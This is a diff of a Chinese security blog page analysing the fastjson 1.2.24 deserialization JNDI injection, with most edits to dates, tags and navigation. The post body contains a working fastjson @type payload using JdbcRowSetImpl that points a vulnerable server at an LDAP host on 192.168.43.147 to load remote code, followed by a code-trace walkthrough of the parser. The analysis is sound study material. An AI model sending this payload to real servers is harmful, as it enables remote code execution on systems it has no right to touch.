@@ -14,7 +14,7 @@
     <meta name="description" content="jndi注入原理学习">
 <meta property="og:type" content="article">
 <meta property="og:title" content="fastjson1.2.24反序列化jndi注入利用调试跟进">
-<meta property="og:url" content="http://example.com/2020/06/25/57/index.html">
+<meta property="og:url" content="http://example.com/2021/03/25/57/index.html">
 <meta property="og:site_name" content="novy&#39;s Blog">
 <meta property="og:description" content="jndi注入原理学习">
 <meta property="og:locale">
@@ -63,10 +63,10 @@
 <meta property="og:image" content="http://example.com/images/57/43.png">
 <meta property="og:image" content="http://example.com/images/57/44.png">
 <meta property="og:image" content="http://example.com/images/57/45.png">
-<meta property="article:published_time" content="2020-06-25T02:14:21.000Z">
-<meta property="article:modified_time" content="2021-06-30T13:18:08.719Z">
+<meta property="article:published_time" content="2021-03-25T02:14:21.000Z">
+<meta property="article:modified_time" content="2021-06-30T13:22:02.316Z">
 <meta property="article:author" content="novy&#39;s Blog">
-<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="fastjson反序列化">
 <meta property="article:tag" content="代码审计">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/57/1.png">
@@ -135,14 +135,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2020/06/25/57/" title="fastjson1.2.24反序列化jndi注入利用调试跟进" itemprop="url">fastjson1.2.24反序列化jndi注入利用调试跟进</a>
+      <a href="/2021/03/25/57/" title="fastjson1.2.24反序列化jndi注入利用调试跟进" itemprop="url">fastjson1.2.24反序列化jndi注入利用调试跟进</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="novy&#39;s Blog" target="_blank" itemprop="author">novy&#39;s Blog</a>
 		
   <p class="article-time">
-    <time datetime="2020-06-25T02:14:21.000Z" itemprop="datePublished"> Published 2020-06-25</time>
+    <time datetime="2021-03-25T02:14:21.000Z" itemprop="datePublished"> Published 2021-03-25</time>
     
   </p>
 </header>
@@ -155,7 +155,8 @@
 		
 		</div>
 		
-		<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Payload</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://192.168.43.147:1389/o=reference&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+		<p>Payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://192.168.43.147:1389/o=reference&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p>前面参数传递省略，分两个部分跟进</p>
 <h1 id="0x01-Fastjson反序列化实现流程跟进"><a href="#0x01-Fastjson反序列化实现流程跟进" class="headerlink" title="0x01.Fastjson反序列化实现流程跟进"></a>0x01.Fastjson反序列化实现流程跟进</h1><p><img src="/images/57/1.png"><br>当参数第一个字符为<code>&#123;</code>时进入<code>case 12</code><br><img src="/images/57/2.png"><br>跟进<code>DefaultJSONParser.parseObject</code><br>随后判断参数如果{的后面是双引号，就使用<code>scanSymbol</code>方法获取双引号里的内容<br><img src="/images/57/3.png"><br>跟进<code>JSONLexerBase.scanSymbol</code><br>开始获取双引号里的内容，扫描传来的值获取key<br><img src="/images/57/4.png"><br><img src="/images/57/5.png"><br><code>Key</code>为<code>@type</code><br><img src="/images/57/6.png"><br>回到<code>JSONLexerBase.scanSymbol</code><br>具体为计算长度，根据长度来获取对应位置的字符，在<code>JSONScanner.next</code>方法中index为双引号开始部分，经过不断遍历，此时index为7，也就是扫描从双引号开始第7位字符的符号，<br><img src="/images/57/7.png"><br>再次得到双引号，符合条件跳出循环<br><img src="/images/57/8.png"><br>最终拿到双引号里的<code>@type</code>符合条件后进入下一步<br><img src="/images/57/9.png"><br>开始扫描下一个双引号里的字符<br><img src="/images/57/10.png"><br>经过像上一步一样的操作最终得到<code>com.sun.rowset.JdbcRowSetImpl</code><br><img src="/images/57/11.png"><br>返回上一层进入下一步<br><img src="/images/57/12.png"><br>此处为取得一些基础类，进入<code>loadclass</code>方法<br><img src="/images/57/13.png"><br>mappings是当前类加载器的缓存（相当于是一个容器，classname是key，根据key从容器取出class对象），此处想要从缓存里取出<code>com.sun.rowset.JdbcRowSetImpl</code>，但是<code>mappings</code>不存在这个对象<br><img src="/images/57/14.png"><br>所以开始下一步的判断，从获取到的<code>ClassName</code>看到第一位字符为c，所以绕过第一个及第二个if进入到try<br><img src="/images/57/15.png"><br><code>Classloader</code>为空不满足条件，继续下一个<code>try</code><br><img src="/images/57/16.png"><br>将<code>com.sun.rowset.JdbcRowSetImpl</code>一系列操作后缓存到<code>mappings</code>里，此时<code>clazz</code>为<code>com.sun.rowset.JdbcRowSetImpl</code>，满足前面<code>clazz</code>不为空的条件<br><img src="/images/57/17.png"><br><img src="/images/57/18.png"><br><img src="/images/57/19.png"><br>即<br><img src="/images/57/20.png"><br>然后通过<code>getDeserializer</code>方法得到clazz对象所有参数<br><img src="/images/57/21.png"><br>跟进<code>Deserializer</code>往下走<br>在<code>getFieId</code>方法里会使用到反射加载的方式来获取对象的的<code>set</code>、<code>get</code>方法<br><img src="/images/57/22.png"><br>获取完对象后开始反序列化<br>随后在做反序列化时<code>clazz</code>重新指定了数据源<br><img src="/images/57/23.png"></p>
@@ -207,7 +208,7 @@
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/反序列化/">反序列化</a><a href="/tags/代码审计/">代码审计</a>
+  <span></span> <a href="/tags/fastjson反序列化/">fastjson反序列化</a><a href="/tags/代码审计/">代码审计</a>
   </div>
 
 </div>
@@ -216,7 +217,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://example.com/2020/06/25/57/" data-title="fastjson1.2.24反序列化jndi注入利用调试跟进 | novy&#39;s Blog" data-tsina="" class="share clearfix">
+	  <div data-url="http://example.com/2021/03/25/57/" data-title="fastjson1.2.24反序列化jndi注入利用调试跟进 | novy&#39;s Blog" data-tsina="" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -230,18 +231,18 @@
 <nav class="article-nav clearfix">
  
  <div class="prev" >
- <a href="/2020/07/10/8/" title="cs免杀后门">
+ <a href="/2021/05/19/55/" title="ysoserial URLDNS  gadget分析笔记">
   <strong>上一篇：</strong><br/>
   <span>
-  cs免杀后门</span>
+  ysoserial URLDNS  gadget分析笔记</span>
 </a>
 </div>
 
 
 <div class="next">
-<a href="/2020/04/10/22/"  title="java审计代码跟进流程(spring)">
+<a href="/2021/03/10/54/"  title="关于类加载的衍生学习">
  <strong>下一篇：</strong><br/> 
- <span>java审计代码跟进流程(spring)
+ <span>关于类加载的衍生学习
 </span>
 </a>
 </div>
@@ -342,11 +343,11 @@
 		<ul class="clearfix">
 		
 			
-				<li><a href="/tags/反序列化/" title="反序列化">反序列化<sup>7</sup></a></li>
+				<li><a href="/tags/JAVA代码审计/" title="JAVA代码审计">JAVA代码审计<sup>6</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/JAVA代码审计/" title="JAVA代码审计">JAVA代码审计<sup>6</sup></a></li>
+				<li><a href="/tags/反序列化/" title="反序列化">反序列化<sup>6</sup></a></li>
 			
 		
 			
@@ -390,6 +391,10 @@
 			
 		
 			
+				<li><a href="/tags/fastjson反序列化/" title="fastjson反序列化">fastjson反序列化<sup>2</sup></a></li>
+			
+		
+			
 				<li><a href="/tags/cobalt-strike后门/" title="cobalt strike后门">cobalt strike后门<sup>2</sup></a></li>
 			
 		
@@ -410,15 +415,11 @@
 			
 		
 			
-				<li><a href="/tags/XSS绕过/" title="XSS绕过">XSS绕过<sup>1</sup></a></li>
+				<li><a href="/tags/Cobalt-Strike/" title="Cobalt Strike">Cobalt Strike<sup>1</sup></a></li>
 			
 		
 			
 				<li><a href="/tags/IDEA/" title="IDEA">IDEA<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/Cobalt-Strike/" title="Cobalt Strike">Cobalt Strike<sup>1</sup></a></li>
 			
 		
 		</ul>
